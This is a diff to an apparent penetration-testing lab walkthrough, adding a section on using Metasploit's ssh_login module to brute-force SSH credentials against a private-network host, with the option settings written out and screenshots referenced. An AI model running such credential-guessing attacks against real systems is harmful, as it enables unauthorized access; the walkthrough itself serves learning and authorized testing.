@@ -86,3 +86,23 @@ and then run/exploit command to execute the payload on target machine
 
 Here our exploit works and we got the reverse tcp shell of the target machine.
 
+### Exploiting SSH using metasploit
+
+As we know ssh port(22) is open lets see we can exploit it using meatasploit
+![ssh exploit](screenshots/ssh_1.png)
+
+Here I got this exploits, and I will be using `auxiliary/scanner/ssh/ssh_login `
+It has many options lets set the required one first
+
+```bash
+
+set RHOSTS 192.168.100.8
+set USER_FILE username.txt # to set a text file  for usernames where each line has expected username
+set PASS_FILE passwd.txt # to set a password text file to check using each user specified above
+set VERBOSE true  # to print all backgound processing 
+```
+
+Lets Exploit....
+
+![ssh shell exploited](screenshots/ssh_2.png)
+
